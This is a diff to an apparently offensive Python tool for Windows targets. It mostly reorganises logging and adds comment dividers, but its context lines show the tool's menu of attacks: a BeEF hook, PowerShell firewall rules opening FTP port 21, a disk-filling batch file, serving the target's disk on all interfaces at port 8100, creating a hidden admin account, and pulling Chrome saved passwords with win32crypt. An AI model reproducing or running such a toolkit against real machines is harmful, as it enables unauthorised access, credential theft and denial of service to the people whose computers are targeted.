@@ -22,6 +22,11 @@ from datetime import datetime, timedelta
 import json
 import win32crypt # type: ignore
 
+logging.basicConfig(
+    filename="logger.log",     # log file name
+    level=logging.INFO,             # log level (INFO, DEBUG, ERROR)
+    format="%(asctime)s - %(levelname)s - %(message)s"
+)
 
 CONFIG_FILE = "config.json"
 
@@ -53,13 +58,6 @@ while True:
 
 
 logging.info(f"Program started")
-
-# Configure logging
-logging.basicConfig(
-    filename="connections.log",     # log file name
-    level=logging.INFO,             # log level (INFO, DEBUG, ERROR)
-    format="%(asctime)s - %(levelname)s - %(message)s"
-)
 
 
 
@@ -156,6 +154,22 @@ while True:
     cls()
 
     
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+
+
 #Action help = showing available actions
     if action == "help":
         logging.info(f"Chosen action help to show available actions")
@@ -176,6 +190,20 @@ while True:
         sleep(0.1)
         input("Press Enter to continue...")
 
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
 
 #Action 0 = Printing the outcome of the scan
     if action == "0":
@@ -192,7 +220,23 @@ while True:
             sleep(4)
     else:
         print("")
+        
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
 
+#action 1 = scanning the machine
     if action == "1":
         logging.info(f"Chosen action 1 to scan the machine")
         scanverify = "yes"
@@ -258,6 +302,21 @@ while True:
         with open("scan_results.json", "w") as f: 
             json.dump(scan_data, f, indent=4)
 
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+
 #Action 2 = beef hook
     if action == "2":
         logging.info(f"Chosen action 2 to attempt beef hook")
@@ -282,6 +341,21 @@ while True:
 
     else:
         print("")
+
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
 
 #Action 3 = local SSH connection
     if action == "3":
@@ -361,6 +435,22 @@ while True:
                 print(" ")
                 sleep(0.1)
                 break
+            
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#Action 4 = FTP connection
     if action == "4":
         logging.info(f"Chosen action 4 to attempt FTP connection")
         fwr21 = 'New-NetFirewallRule -DisplayName "Allow FTP 21" -Direction Inbound -Protocol TCP -LocalPort 21 -Action Allow'
@@ -370,12 +460,42 @@ while True:
         ftpconnect=r".\ftp "+ftpuser+"@"+ftpIP
         run_ps(ftpconnect)
 
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#Action 5 = pinging target IP
     if action == "5":
         logging.info(f"Chosen action 5 to check IP connectivity and response")
         targetip=input("Enter target IP to ping: ")
         subprocess.run(["ping", targetip])
         logging.info(f"Pinging the target machine")
         
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#Action 6 = filling up disk space
     if action == "6":
         logging.info(f"Chose action 6 to fill a target computer disk")
         usermovefile=input("Did you move the installed files from each other? (meaning this program being somewhere different than the other files included in this repo? y/n: ")
@@ -387,6 +507,21 @@ while True:
 
         logging.info(f"Started the diskfiller.bat")
     
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#Action 7 = hosting target disk on local network
     if action == "7":
         logging.info(f"Chosen action 7 to host target disk onto a local network")
         hostdisk="python -m http.server 8100 --bind 0.0.0.0"
@@ -398,6 +533,21 @@ while True:
         sleep(0.5)
         print("Go to http//:<targetip>:8100   to browse the files")
 
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#Action 8 = creating new admin account on target machine
     if action =="8":
         logging.info(f"Chosen action 8 to generate a new admin account on target machine")
         newadminuser=input("Enter new admin username: ")
@@ -412,6 +562,21 @@ while True:
         print(Fore.GREEN + "New admin user created: " + newadminuser)
         logging.info(f"New admin user created: {newadminuser}")
 
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#Action 9 = retrieving Chrome saved passwords
     if action == "9":
         logging.info(f"Chosen action 9 to retrieve Chrome browsing history")
         
@@ -650,6 +815,21 @@ while True:
     else:
         print("")
         sleep(0.1)
+
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
 
 #Action 99 = exiting the program
     if action == "99":
